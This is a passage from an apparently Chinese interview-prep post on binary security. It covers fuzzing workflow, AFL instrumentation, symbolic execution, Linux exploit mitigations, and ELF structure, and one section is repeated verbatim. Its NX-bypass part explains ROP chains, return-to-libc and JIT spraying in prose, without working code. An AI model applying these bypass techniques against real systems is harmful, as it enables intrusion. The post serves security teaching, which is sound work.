<li>字典文件（如果目标程序有特定的关键字）</li>
</ul>
</li>
</ul>
<p><strong>3. Fuzzing 运行</strong></p>
<p>这个阶段是 Fuzzing 的核心，Fuzzer 将持续不断地生成、变异和测试输入</p>
<ul>
<li><strong>启动 Fuzzer</strong>：运行 Fuzzer 进程，将种子文件作为输入，并指定输出目录</li>
<li><strong>监控 Fuzzing 状态</strong>：在 Fuzzing 过程中，需要持续监控其状态。好的 Fuzzer 都会提供一个状态界面，显示：<ul>
<li>测试速度（每秒执行次数）</li>
<li>代码覆盖率</li>
<li>发现的崩溃数量和异常（<code>timeout</code>）数量</li>
<li>队列中已有的有价值的输入数量</li>
</ul>
</li>
<li><strong>分析结果</strong>：当 Fuzzer 发现一个崩溃或异常时，它会将导致该问题的输入文件保存在一个特定的目录中。你需要定期检查这个目录，并对新发现的崩溃进行分类和分析</li>
</ul>
<p><strong>4. 漏洞分析与验证</strong></p>
<p>这个阶段是<strong>人工分析</strong>的过程，目的是将 Fuzzer 发现的“崩溃”转化为可利用的“漏洞”</p>
<ul>
<li><strong>漏洞重现</strong>：首先，你需要用调试器（如 GDB, WinDbg）或逆向工具（如 IDA Pro）来加载导致崩溃的输入文件，并<strong>重现崩溃</strong>。这能帮助你确定崩溃的类型和位置</li>
<li><strong>漏洞分类</strong>：将崩溃分为不同的类型，例如<strong>栈溢出、堆溢出、空指针解引用</strong>等。这有助于你理解漏洞的性质</li>
<li><strong>可利用性分析</strong>：并非所有的崩溃都是可利用的漏洞。你需要分析崩溃的原因和上下文，判断攻击者是否能通过它来劫持程序流或执行任意代码</li>
<li><strong>漏洞报告</strong>：一旦确认漏洞是可利用的，你需要编写一份详细的漏洞报告，包括：<ul>
<li>漏洞的描述和类型</li>
<li>导致漏洞的输入文件</li>
<li>崩溃发生时的堆栈信息</li>
<li>漏洞的严重性评估</li>
</ul>
</li>
</ul>
<p><strong>5. 修复与回归测试</strong></p>
<p>这是整个流程的最后一步，也是最重要的</p>
<ul>
<li><strong>漏洞修复</strong>：将漏洞报告交给开发者，由他们来修复代码中的缺陷</li>
<li><strong>回归测试</strong>：在修复完成后，你需要将导致漏洞的输入文件添加到你的测试套件中，确保未来的代码修改不会再次引入这个漏洞。这个过程也被称为<strong>回归测试</strong></li>
</ul>
<hr>
<h3 id="讲一下-AFL-的插桩原理"><a href="#讲一下-AFL-的插桩原理" class="headerlink" title="讲一下 AFL 的插桩原理"></a>讲一下 AFL 的插桩原理</h3><p><strong>插桩的本质：反馈导向的模糊测试</strong></p>
<p>AFL 的插桩（instrumentation）就是一套用于收集<strong>代码覆盖率</strong>的探针。通过这些探针，AFL 可以知道某个输入执行了哪些代码路径</p>
<p>它的工作流程是这样的：</p>
<ol>
<li><strong>编译时插桩</strong>：用 AFL 提供的特殊编译器（<code>afl-clang-fast</code> 或 <code>afl-gcc</code>）来编译目标程序</li>
<li><strong>运行时反馈</strong>：当程序执行时，插桩代码会向 AFL 反馈代码执行路径信息</li>
<li><strong>智能变异</strong>：AFL 根据这些反馈，判断哪些输入“有价值”（即探索了新的代码路径），然后对这些有价值的输入进行更多的变异</li>
</ol>
<p>这个反馈循环是 AFL 高效的关键。它使得 AFL 能够自动绕过复杂的输入校验，深入到程序更深层次的逻辑中，从而找到隐藏的漏洞</p>
<p><strong>插桩的原理实现</strong></p>
<p>AFL 的插桩非常轻量级，它采用了一种基于**基本块（Basic Block）**的简单而巧妙的方案。</p>
<p><strong>1. 什么是基本块？</strong></p>
<p>在程序中，一个基本块是一段连续的代码，它只有一个入口点（第一条指令）和一个出口点（最后一条指令），且中间没有任何分支跳转</p>
<p>你可以把基本块看作是代码中的最小“执行单元”</p>
<p><strong>2. AFL 的插桩步骤</strong></p>
<p>AFL 在编译时，会在<strong>每个基本块的入口</strong>插入一段代码。这段代码会做两件事：</p>
<ul>
<li><strong>获取当前基本块的 ID</strong>：AFL 在编译时会给每个基本块分配一个唯一的随机 ID</li>
<li><strong>记录基本块的 ID</strong>：AFL 维护一个<strong>共享内存区域</strong>，通常是一个大小为 64KB 的位图（bitmap）</li>
</ul>
<p>当程序执行到一个新的基本块时，插入的代码会执行以下操作：</p>
<ol>
<li>获取当前基本块的 ID（假设是 <code>current_id</code>）</li>
<li>获取<strong>上一个</strong>执行的基本块的 ID（假设是 <code>prev_id</code>）。AFL 用一个全局变量来保存这个 <code>prev_id</code></li>
<li>计算一个哈希值：<code>index = current_id XOR prev_id</code></li>
<li>将这个 <code>index</code> 映射到位图的某个位置，并将该位置的值加 1</li>
<li>更新 <code>prev_id</code>，使其等于 <code>current_id</code></li>
</ol>
<hr>
<h3 id="怎么选择-fuzz-测试点"><a href="#怎么选择-fuzz-测试点" class="headerlink" title="怎么选择 fuzz 测试点"></a>怎么选择 fuzz 测试点</h3><p><strong>1. 优先选择处理复杂格式输入的代码</strong></p>
<p>处理复杂、非结构化输入的代码是 Fuzzing 的首选目标。这类代码通常包含复杂的解析逻辑和状态机，容易在处理畸形数据时出错</p>
<ul>
<li><strong>文件解析器</strong>：这是最典型的 Fuzzing 目标。例如，图片格式（JPEG, PNG）、视频格式（MP4, AVI）、文档格式（PDF, DOCX）的解析库或应用程序。Fuzzer 可以轻松生成无数个格式畸形的样本，测试解析器对异常情况的处理能力</li>
<li><strong>网络协议栈</strong>：处理网络协议的代码是高价值目标。例如，Web 服务器、FTP 守护进程、或者物联网设备的通信协议。Fuzzer 可以向这些服务发送不符合协议规范的数据包，测试其鲁棒性</li>
<li><strong>编译器和解释器</strong>：对编程语言的编译器或解释器进行 Fuzzing，可以发现它们在处理语法错误或逻辑异常的代码时的漏洞。例如，对 JavaScript 引擎的 Fuzzing 已经发现了无数高价值的漏洞</li>
</ul>
<p><strong>2. 考虑执行权限和攻击面</strong></p>
<p>选择 Fuzzing 点时，要将漏洞的潜在危害考虑在内</p>
<ul>
<li><strong>高权限代码</strong>：如果一个程序以 <code>root</code>、<code>SYSTEM</code> 或其他高权限运行，那么它的漏洞危害会更大。对这类程序的 Fuzzing 应该作为首要任务。例如，内核驱动、特权服务、或者安全软件</li>
<li><strong>暴露在外部的接口</strong>：攻击者可以直接访问的接口是 Fuzzing 的高优先级目标。例如，通过网络监听端口、接受外部文件的服务，或者处理命令行参数的程序。这些接口是攻击者的第一道入口</li>
</ul>
<p><strong>3. 基于代码复杂性分析</strong></p>
<p>如果可以访问源码，可以更精确地选择 Fuzzing 点</p>
<ul>
<li><strong>复杂的控制流</strong>：在代码中寻找包含大量 <code>if-else</code>、<code>switch</code> 语句、嵌套循环或复杂状态机的函数。这些地方的代码路径多且复杂，很容易出现逻辑错误和漏洞</li>
<li><strong>涉及内存操作的代码</strong>：寻找使用 <code>malloc</code>、<code>free</code>、<code>memcpy</code>、<code>read</code> 等内存相关函数的代码。这些函数是缓冲区溢出、Use-After-Free 等内存安全漏洞的常见源头</li>
<li><strong>缺乏边界检查的代码</strong>：在代码中寻找缺乏对输入数据大小进行严格检查的地方。这通常是缓冲区溢出漏洞的温床</li>
</ul>
<p><strong>4. 结合自动化工具进行决策</strong></p>
<p>为了避免盲目选择，可以使用自动化工具来辅助决策</p>
<ul>
<li><strong>代码覆盖率工具</strong>：使用像 <code>gcov</code> 或 <code>llvm-profdata</code> 这样的工具，运行已知的测试用例，分析哪些代码区域没有被覆盖到。这些未覆盖的区域往往是 Fuzzing 的好目标</li>
<li><strong>静态分析工具</strong>：使用静态分析工具（如 <code>Coverity</code>、<code>Clang Static Analyzer</code>）来扫描代码，寻找潜在的漏洞模式，比如整数溢出或空指针解引用。然后，将这些潜在的漏洞位置作为 Fuzzing 的重点</li>
</ul>
<hr>
<h3 id="哪些漏洞可以用-fuzz-检测到"><a href="#哪些漏洞可以用-fuzz-检测到" class="headerlink" title="哪些漏洞可以用 fuzz 检测到"></a>哪些漏洞可以用 fuzz 检测到</h3><p><strong>内存安全漏洞</strong></p>
<p>这是 Fuzzing 最擅长的领域，也是 Fuzzing 历史上发现最多高价值漏洞的类型。这些漏洞通常会导致程序崩溃、数据损坏或信息泄露</p>
<ul>
<li><strong>缓冲区溢出（Buffer Overflows）</strong>：当程序向一个固定大小的缓冲区写入的数据超出了其容量时，就会发生溢出。Fuzzer 可以通过生成超长字符串、大文件或超大数组等输入来触发这类漏洞</li>
<li><strong>整数溢出（Integer Overflows）</strong>：当一个整数运算的结果超出其数据类型的最大值时，会发生溢出。Fuzzer 可以提供接近最大值或负数的输入，试图触发不正确的内存分配或边界检查绕过</li>
<li><strong>空指针解引用（Null Pointer Dereference）</strong>：当程序试图访问一个空指针指向的内存时，会发生崩溃。Fuzzer 可以提供导致函数返回空指针的输入，例如不完整的协议数据包或畸形的文件头</li>
<li><strong>UAF（Use-After-Free）</strong>：当程序在释放一块内存后，仍然使用指向这块内存的指针时，就会发生 UAF。Fuzzer 可以通过提供复杂的、有状态的输入序列来触发这种时序性漏洞</li>
<li><strong>双重释放（Double Free）</strong>：当程序两次释放同一块内存时，会引发严重后果。Fuzzer 可以提供导致程序进入异常逻辑的输入，从而触发重复的内存释放操作</li>
<li><strong>格式化字符串漏洞（Format String Bugs）</strong>：当程序使用 <code>printf</code> 等函数，且格式化字符串可由用户控制时，攻击者可以利用它来读写内存。Fuzzer 可以尝试在输入中插入 <code>%s</code>, <code>%n</code>, <code>%x</code> 等格式符来检测这种漏洞</li>
</ul>
<p><strong>逻辑漏洞和异常情况</strong></p>
<p>除了内存安全问题，Fuzzing 也可以用来发现更复杂的逻辑漏洞，尽管这通常需要更智能的 Fuzzer 或额外的检测机制</p>
<ul>
<li><strong>逻辑错误（Logical Bugs）</strong>：Fuzzer 可以通过提供畸形但不会导致崩溃的输入，来发现程序中不正确的逻辑。例如，一个输入可能导致数据库返回错误的结果，或者一个视频播放器无法正确解析视频帧</li>
<li><strong>拒绝服务（Denial of Service, DoS）</strong>：当一个输入导致程序进入无限循环或消耗大量资源时，就会引发 DoS 攻击。Fuzzer 可以通过监控程序执行时间或资源消耗来检测这类问题</li>
<li><strong>竞态条件（Race Conditions）</strong>：在多线程或多进程程序中，Fuzzer 可以通过随机化输入发送时间或使用多个线程来触发竞态条件，从而发现漏洞</li>
<li><strong>权限绕过（Privilege Escalation）</strong>：Fuzzing 可以用来寻找程序在处理特殊输入时，是否会错误地提升权限</li>
<li><strong>信息泄露（Information Leakage）</strong>：Fuzzer 可以通过分析程序的输出或返回值，来检测程序是否泄露了不应被公开的敏感信息，比如内存地址或调试信息</li>
</ul>
<hr>
<h3 id="哪些漏洞可以用-fuzz-检测到-1"><a href="#哪些漏洞可以用-fuzz-检测到-1" class="headerlink" title="哪些漏洞可以用 fuzz 检测到"></a>哪些漏洞可以用 fuzz 检测到</h3><p><strong>内存安全漏洞</strong></p>
<p>这是 Fuzzing 最擅长的领域，也是 Fuzzing 历史上发现最多高价值漏洞的类型。这些漏洞通常会导致程序崩溃、数据损坏或信息泄露</p>
<ul>
<li><strong>缓冲区溢出（Buffer Overflows）</strong>：当程序向一个固定大小的缓冲区写入的数据超出了其容量时，就会发生溢出。Fuzzer 可以通过生成超长字符串、大文件或超大数组等输入来触发这类漏洞</li>
<li><strong>整数溢出（Integer Overflows）</strong>：当一个整数运算的结果超出其数据类型的最大值时，会发生溢出。Fuzzer 可以提供接近最大值或负数的输入，试图触发不正确的内存分配或边界检查绕过</li>
<li><strong>空指针解引用（Null Pointer Dereference）</strong>：当程序试图访问一个空指针指向的内存时，会发生崩溃。Fuzzer 可以提供导致函数返回空指针的输入，例如不完整的协议数据包或畸形的文件头</li>
<li><strong>UAF（Use-After-Free）</strong>：当程序在释放一块内存后，仍然使用指向这块内存的指针时，就会发生 UAF。Fuzzer 可以通过提供复杂的、有状态的输入序列来触发这种时序性漏洞</li>
<li><strong>双重释放（Double Free）</strong>：当程序两次释放同一块内存时，会引发严重后果。Fuzzer 可以提供导致程序进入异常逻辑的输入，从而触发重复的内存释放操作</li>
<li><strong>格式化字符串漏洞（Format String Bugs）</strong>：当程序使用 <code>printf</code> 等函数，且格式化字符串可由用户控制时，攻击者可以利用它来读写内存。Fuzzer 可以尝试在输入中插入 <code>%s</code>, <code>%n</code>, <code>%x</code> 等格式符来检测这种漏洞</li>
</ul>
<p><strong>逻辑漏洞和异常情况</strong></p>
<p>除了内存安全问题，Fuzzing 也可以用来发现更复杂的逻辑漏洞，尽管这通常需要更智能的 Fuzzer 或额外的检测机制</p>
<ul>
<li><strong>逻辑错误（Logical Bugs）</strong>：Fuzzer 可以通过提供畸形但不会导致崩溃的输入，来发现程序中不正确的逻辑。例如，一个输入可能导致数据库返回错误的结果，或者一个视频播放器无法正确解析视频帧</li>
<li><strong>拒绝服务（Denial of Service, DoS）</strong>：当一个输入导致程序进入无限循环或消耗大量资源时，就会引发 DoS 攻击。Fuzzer 可以通过监控程序执行时间或资源消耗来检测这类问题</li>
<li><strong>竞态条件（Race Conditions）</strong>：在多线程或多进程程序中，Fuzzer 可以通过随机化输入发送时间或使用多个线程来触发竞态条件，从而发现漏洞</li>
<li><strong>权限绕过（Privilege Escalation）</strong>：Fuzzing 可以用来寻找程序在处理特殊输入时，是否会错误地提升权限</li>
<li><strong>信息泄露（Information Leakage）</strong>：Fuzzer 可以通过分析程序的输出或返回值，来检测程序是否泄露了不应被公开的敏感信息，比如内存地址或调试信息</li>
</ul>
<hr>
<h3 id="符号执行是如何做约束求解的"><a href="#符号执行是如何做约束求解的" class="headerlink" title="符号执行是如何做约束求解的"></a>符号执行是如何做约束求解的</h3><p><strong>1. 什么是约束求解</strong></p>
<p>一个约束求解器（也叫 SMT Solver，Satisfiability Modulo Theories Solver）是符号执行的“大脑”。它的工作是解决一个公式（或一组公式）是否可满足</p>
<p>例如，对于一个简单的程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (x + y &gt; <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Branch 1&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Branch 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>符号执行会将 <code>x</code> 和 <code>y</code> 变成符号 <code>X</code> 和 <code>Y</code>。如果要探索 Branch 1，它就会生成约束：<code>X + Y &gt; 10</code></p>
<p>约束求解器接收这个约束，然后找到满足这个条件的具体值。一个可能的解是 <code>X=5</code>，<code>Y=6</code>。符号执行器就可以用 <code>x=5</code>, <code>y=6</code> 作为输入，来验证 Branch 1 是否可达</p>
<p><strong>2. 约束求解的内部工作原理</strong></p>
<p>约束求解器本身是基于一套复杂的算法来工作的，主要包括：</p>
<p><strong>a. 逻辑分解</strong></p>
<p>求解器首先会分析给定的约束公式，将其分解为更小的、可管理的子问题。例如，一个复杂的逻辑表达式 <code>(A &amp;&amp; B) || C</code> 会被分解成两个独立的子问题：<code>A &amp;&amp; B</code> 和 <code>C</code></p>
<p><strong>b. 理论推理</strong></p>
<p>SMT Solver 的“理论”部分是它的核心能力。它能够理解并处理不同领域（如整数、数组、位向量等）的约束。例如：</p>
<ul>
<li><strong>算术理论（Arithmetic Theory）</strong>：处理 <code>+</code>, <code>-</code>, <code>*</code>, <code>&gt;</code> 等数学运算</li>
<li><strong>位向量理论（Bitvector Theory）</strong>：处理二进制位运算，如 <code>&amp;</code>, <code>|</code>, <code>^</code>, <code>&lt;&lt;</code> 等。这对于分析底层二进制代码至关重要</li>
<li><strong>数组理论（Array Theory）</strong>：处理数组的读写操作</li>
</ul>
<p>当一个约束公式涉及到多个理论时，SMT Solver 会使用一种叫 <strong>CDCL(T)</strong>（Conflict-Driven Clause Learning with Theories）的算法，协调各个理论求解器来解决问题。</p>
<p><strong>c. 变量赋值与回溯</strong></p>
<p>求解器会尝试给变量赋值，并检查这些赋值是否满足约束</p>
<ul>
<li><strong>如果满足</strong>：它会继续给其他未赋值的变量赋值，直到找到一个完整的解</li>
<li><strong>如果不满足</strong>：它会回溯（backtrack），撤销之前的赋值，并尝试新的组合</li>
</ul>
<p>这个过程很像解决数独，每一步的赋值都会影响后续的选择，而当发现无解时，就需要退回到上一步重新选择</p>
<p><strong>3. 符号执行与约束求解的结合</strong></p>
<p>符号执行器和约束求解器是紧密配合的</p>
<ol>
<li><p><strong>符号执行器</strong>：</p>
<ul>
<li>遍历程序代码，将变量抽象为符号</li>
<li>遇到分支（<code>if</code>, <code>while</code>）时，为每个分支生成一个<strong>路径约束</strong></li>
<li>将路径约束传递给约束求解器</li>
</ul>
</li>
<li><p><strong>约束求解器</strong>：</p>
<ul>
<li>接收路径约束</li>
<li>尝试找到满足约束的一组具体值</li>
<li>如果找到了解，就将解返回给符号执行器</li>
</ul>
</li>
<li><p><strong>符号执行器</strong>：</p>
<ul>
<li>使用求解器返回的具体值作为输入，来探索新的代码路径</li>
<li>如果求解器返回“无解”（unsatisfiable），则说明该代码路径不可达</li>
</ul>
<hr>
</li>
</ol>
<h3 id="讲讲-Linux-平台的漏洞缓解机制"><a href="#讲讲-Linux-平台的漏洞缓解机制" class="headerlink" title="讲讲 Linux 平台的漏洞缓解机制"></a>讲讲 Linux 平台的漏洞缓解机制</h3><p><strong>1. 堆栈保护（Stack Smashing Protection, SSP）</strong></p>
<p>这是最基础，也是最重要的堆栈溢出缓解机制</p>
<ul>
<li><strong>原理：</strong> 在函数调用时，编译器会在栈上的<strong>局部变量和返回地址之间插入一个随机的“金丝雀值”（Canary Value）</strong></li>
<li><strong>工作方式：</strong><ul>
<li>函数进入时，金丝雀值被推入栈中</li>
<li>函数返回前，程序会检查这个金丝雀值是否被改变</li>
<li>如果金丝雀值被修改，说明发生了缓冲区溢出，程序会立即终止（通常会调用 <code>__stack_chk_fail</code> 函数），而不是让攻击者控制程序流</li>
</ul>
</li>
<li><strong>局限性：</strong> 攻击者可以通过覆盖低地址的变量或利用其他漏洞（如格式化字符串漏洞）来泄露金丝雀值，从而绕过此保护</li>
</ul>
<p><strong>2. 地址空间布局随机化（Address Space Layout Randomization, ASLR）</strong></p>
<p>ASLR 是一个非常有效的漏洞缓解机制，它让攻击者难以预测内存中关键数据的位置</p>
<ul>
<li><strong>原理：</strong> 每次程序启动时，ASLR 会将程序的主要内存区域（如<strong>可执行文件基址、堆、栈和共享库（DLL&#x2F;SO）</strong>）加载到随机的地址上</li>
<li><strong>工作方式：</strong> 攻击者在利用漏洞时，通常需要知道某个函数（例如 <code>system</code> 函数）或某个数据（例如返回地址）的精确内存地址。ASLR 打破了这种确定性，使得攻击者无法在不知道这些地址的情况下构造 ROP 链（Return-Oriented Programming）</li>
<li><strong>局限性：</strong><ul>
<li><strong>熵不足：</strong> 早期版本的 ASLR 随机化范围有限，攻击者可以通过暴力破解或多次尝试来绕过</li>
<li><strong>信息泄露：</strong> 如果程序存在信息泄露漏洞（如格式化字符串漏洞），攻击者可以泄露出某个模块的基址，从而推算出其他所有函数的地址，绕过 ASLR</li>
</ul>
</li>
</ul>
<p><strong>3. 不可执行内存（Non-Executable Memory）&#x2F; NX 位（No-eXecute）</strong></p>
<p>这是为了防止攻击者将恶意代码注入数据段（如堆或栈）并执行而设计的</p>
<ul>
<li><strong>原理：</strong> CPU 的 MMU（内存管理单元）会根据内存页的权限来决定是否允许执行该页中的代码。NX 位被设置在页表项中，如果该位为 1，则该页不可执行</li>
<li><strong>工作方式：</strong> 操作系统会将堆、栈等数据段标记为<strong>不可执行</strong>。当攻击者利用缓冲区溢出将 Shellcode（恶意代码）写入栈上并尝试执行时，CPU 会抛出异常，阻止代码的执行</li>
<li><strong>局限性：</strong><ul>
<li><strong>ROP 攻击：</strong> ROP（Return-Oriented Programming）是一种绕过 NX 位的方法。攻击者不注入代码，而是通过利用程序本身已有的代码片段（称为“gadgets”），并精心构造返回地址链来执行恶意逻辑</li>
<li><strong>JIT（即时编译）代码：</strong> 对于一些需要动态生成和执行代码的应用程序（如 Java 或 JavaScript 引擎），它们需要创建可执行的内存区域，这可能会被攻击者利用</li>
</ul>
</li>
</ul>
<p><strong>4. 只读重定位（Read-Only Relocations, RELRO）</strong></p>
<p>RELRO 旨在保护程序在加载后不被修改，特别是全局偏移表（GOT）和过程链接表（PLT）</p>
<ul>
<li><strong>原理：</strong><ul>
<li><strong>GOT（Global Offset Table）：</strong> 存储了外部共享库函数的实际地址</li>
<li><strong>PLT（Procedure Linkage Table）：</strong> 负责将函数调用重定向到 GOT</li>
</ul>
</li>
<li><strong>工作方式：</strong><ul>
<li><strong>部分 RELRO：</strong> 在程序加载时，<code>.got</code> 段是可写的，因为加载器需要填充外部函数的地址。加载后，<code>.got</code> 段变为只读</li>
<li><strong>完全 RELRO：</strong> 将 GOT 表完全设置为只读，所有重定位都在程序加载前完成</li>
</ul>
</li>
<li><strong>局限性：</strong> 攻击者无法再利用 GOT 覆写漏洞来劫持程序流。然而，它并不能防御所有类型的攻击</li>
</ul>
<p><strong>5. 控制流完整性（Control Flow Integrity, CFI）</strong></p>
<p>CFI 是一种更高级的保护机制，它旨在确保程序执行的控制流不会被攻击者劫持</p>
<ul>
<li><strong>原理：</strong> CFI 在编译和链接阶段为每个间接调用（如函数指针调用）和返回指令创建元数据，并在运行时检查这些元数据，确保控制流的跳转是合法的、预期的</li>
<li><strong>工作方式：</strong><ul>
<li><strong>向前边沿 CFI（Forward-Edge）：</strong> 保护间接函数调用，确保函数指针只能跳转到其类型兼容的函数</li>
<li><strong>向后边沿 CFI（Backward-Edge）：</strong> 保护函数返回，确保返回地址不会被篡改</li>
</ul>
</li>
<li><strong>局限性：</strong> CFI 的实现较为复杂，并且可能引入性能开销。虽然能防御 ROP 攻击，但并不能防御所有类型的攻击，且可以被绕过</li>
</ul>
<hr>
<h3 id="NX-是怎么绕过的"><a href="#NX-是怎么绕过的" class="headerlink" title="NX 是怎么绕过的"></a>NX 是怎么绕过的</h3><p><strong>绕过 NX 的基本思路</strong></p>
<p>NX 阻止了攻击者在数据段上执行<strong>自己的代码</strong>。那么，绕过 NX 的基本思路就是：<strong>不注入代码，而是利用程序本身已有的、具有执行权限的代码</strong></p>
<p>这个思路催生了多种绕过技术，其中最主要、最著名、最通用的就是 <strong>ROP</strong></p>
<p><strong>ROP</strong></p>
<p>ROP 是目前最主流的 NX 绕过技术。它的原理是利用程序中已有的、以 <code>ret</code> 指令结尾的短小代码片段，这些片段被称为 <strong>“gadgets”</strong></p>
<p><strong>ROP 的工作原理</strong></p>
<ol>
<li><strong>寻找 Gadgets：</strong> 攻击者首先在目标程序或其依赖的共享库（如 <code>libc</code>）中寻找一系列以 <code>ret</code> 指令结尾的“gadgets”。一个 gadget 可能是一条或几条汇编指令，例如：<code>pop edi; ret;</code> 或 <code>mov eax, [ebx]; ret;</code></li>
<li><strong>构建 ROP 链：</strong> 攻击者利用漏洞（如缓冲区溢出），用一系列精心挑选的 gadget 地址来覆盖栈上的返回地址这些地址按顺序排列，形成一个 <strong>“ROP 链”</strong></li>
<li><strong>劫持控制流：</strong> 当函数返回时，它不再返回到正常调用的地方，而是返回到 ROP 链中的第一个 gadget</li>
<li><strong>链式执行：</strong><ul>
<li>第一个 gadget 执行完后，其末尾的 <code>ret</code> 指令会从栈上弹出下一个地址，也就是 ROP 链中的第二个 gadget</li>
<li>这样，一个 gadget 接一个 gadget 地执行，每个 <code>ret</code> 指令都将控制流转移到下一个 gadget</li>
<li>通过这种方式，攻击者可以利用程序中已有的代码，间接地执行任意恶意逻辑</li>
</ul>
</li>
</ol>
<p><strong>ROP 攻击的最终目标</strong></p>
<p>一个典型的 ROP 攻击，其最终目标通常是调用某个函数，比如 <code>system()</code>，并将一个指向 Shell 命令字符串（例如 <code>&quot;/bin/sh&quot;</code>）的指针作为参数传递给它</p>
<p>一个完整的 ROP 链通常包含：</p>
<ul>
<li><strong><code>pop</code> gadget：</strong> 用于将栈上的参数值弹出到寄存器中，为函数调用做准备</li>
<li><strong><code>system()</code> 的地址：</strong> ROP 链的末尾，用于最终调用 <code>system()</code></li>
<li><strong>字符串 <code>/bin/sh</code> 的地址：</strong> 作为 <code>system()</code> 的参数</li>
</ul>
<p><strong>绕过 NX 的其他方法</strong></p>
<p>除了 ROP，还有其他一些不那么常见，但同样能绕过 NX 的技术：</p>
<p><strong>1. JIT Spraying（JIT 喷射）</strong></p>
<p>这种方法主要用于绕过浏览器中的 NX 保护</p>
<ul>
<li><strong>原理：</strong> JIT（Just-In-Time）编译器会动态地生成可执行代码。攻击者可以利用 JavaScript 等语言的 JIT 特性，构造大量的 <code>nop</code> 指令（无操作指令），然后在其末尾附上 Shellcode</li>
<li><strong>工作方式：</strong> JIT 引擎会将这些指令编译成原生机器码并存放在一个<strong>可执行的</strong>内存区域。攻击者只需找到这个可执行区域的地址，并跳转过去即可</li>
</ul>
<p><strong>2. Return-to-libc（返回到 libc）</strong></p>
<p>Return-to-libc 是 ROP 的前身和简化版。它不需要复杂的 gadget 链，而是直接劫持程序流，跳转到已加载的 <code>libc</code> 库中的一个函数</p>
<ul>
<li><strong>原理：</strong> 攻击者利用漏洞，用 <code>libc</code> 中 <code>system()</code> 函数的地址覆盖栈上的返回地址</li>
<li><strong>工作方式：</strong> 当函数返回时，程序流会直接跳转到 <code>system()</code> 函数。攻击者在栈上预先放置好 <code>system()</code> 函数所需的参数（如 <code>&quot;/bin/sh&quot;</code> 的地址），即可实现代码执行</li>
<li><strong>局限性：</strong> 这种方法非常简单，但它只能调用 <code>libc</code> 中已有的函数，而不能像 ROP 那样组合出更复杂的逻辑</li>
</ul>
<hr>
<h3 id="讲讲-Linux-平台的-ELF-文件结构"><a href="#讲讲-Linux-平台的-ELF-文件结构" class="headerlink" title="讲讲 Linux 平台的 ELF 文件结构"></a>讲讲 Linux 平台的 ELF 文件结构</h3><p><strong>ELF 文件的两种视图</strong></p>
<p>理解 ELF 文件的关键在于，它有两个不同的、但相互关联的视图：</p>
<ol>
<li><strong>链接视图（Linking View）：</strong> 供编译器和链接器使用。它由**节（Sections）**组成，主要用于编译、链接和重定位</li>
<li><strong>执行视图（Execution View）：</strong> 供操作系统加载器使用。它由**段（Segments）**组成，用于将程序加载到内存中并执行</li>
</ol>
<p>这两种视图由 ELF 头部中的两个表来描述：节头部表和程序头部表</p>
<p><strong>ELF 头部</strong></p>
<p>每个 ELF 文件的开头都是一个 ELF 头部，它提供了文件的基本信息，就像 PE 文件的 DOS 头部一样。它定义了文件的类型、机器架构、入口点地址等</p>
<p>ELF 头部最重要的一些字段是：</p>
<ul>
<li><code>e_ident[EI_MAG0-3]</code>：4 字节的魔数，固定为 <code>0x7f, &#39;E&#39;, &#39;L&#39;, &#39;F&#39;</code>。这是识别 ELF 文件的唯一标志</li>
<li><code>e_ident[EI_CLASS]</code>：指定文件架构，<code>1</code> 代表 32 位，<code>2</code> 代表 64 位</li>
<li><code>e_ident[EI_DATA]</code>：指定字节序，<code>1</code> 代表小端序，<code>2</code> 代表大端序</li>
<li><code>e_type</code>：文件类型，如 <code>ET_EXEC</code>（可执行文件）、<code>ET_DYN</code>（共享库）、<code>ET_REL</code>（可重定位文件）</li>
<li><code>e_entry</code>：程序的入口点地址（虚拟地址）</li>
<li><code>e_phoff</code>：程序头部表（Program Header Table）的文件偏移量</li>
<li><code>e_shoff</code>：节头部表（Section Header Table）的文件偏移量</li>
<li><code>e_phentsize</code>：程序头部表中每个条目的大小</li>
<li><code>e_phnum</code>：程序头部表的条目数量</li>
<li><code>e_shentsize</code>：节头部表中每个条目的大小</li>
<li><code>e_shnum</code>：节头部表的条目数量</li>
</ul>
<p><strong>链接视图：节</strong></p>
<p>节是 ELF 文件的基本单元，用于组织文件中的各种数据和代码。每个节都有特定的目的</p>
<p>常见的节有：</p>
<ul>
<li><code>.text</code>：包含可执行代码</li>
<li><code>.data</code>：包含已初始化的全局变量和静态变量</li>
<li><code>.rodata</code>：包含只读数据，如字符串常量</li>
<li><code>.bss</code>：包含未初始化的全局变量和静态变量，在文件中不占用空间，加载时由加载器分配和清零</li>
<li><code>.symtab</code>：符号表，包含了程序中所有符号（函数名、变量名）的信息</li>
<li><code>.strtab</code>：字符串表，存储符号表中的字符串</li>
<li><code>.debug</code>：调试信息，用于 GDB 等调试器</li>
<li><code>.got</code>（Global Offset Table）：全局偏移表，用于在运行时解析外部函数地址</li>
<li><code>.plt</code>（Procedure Linkage Table）：过程链接表，用于动态链接</li>
</ul>
<p><strong>节头部表</strong></p>
<p>节头部表是一个描述所有节的数组。每个条目都是一个 <code>Elf64_Shdr</code>（对于 64 位）结构体，它包含了每个节的名称、类型、权限、文件偏移、内存地址和大小等信息。链接器和反汇编工具（如 objdump）主要依赖这个表来分析文件结构</p>
<p><strong>执行视图：段</strong></p>
<p>当程序需要被加载到内存中执行时，节会被组合成更大的逻辑单元——<strong>段</strong>。每个段都具有相同的内存权限（可读、可写、可执行）。这是加载器关心的内容</p>
<p>典型的段有两个：</p>
<ul>
<li><strong>代码段（Code Segment）：</strong> 通常包含 <code>.text</code> 和 <code>.rodata</code> 节。这个段被映射到内存中，并具有<strong>可读和可执行</strong>权限</li>
<li><strong>数据段（Data Segment）：</strong> 通常包含 <code>.data</code> 和 <code>.bss</code> 节。这个段被映射到内存中，并具有<strong>可读和可写</strong>权限</li>
</ul>
<p><strong>程序头部表</strong></p>
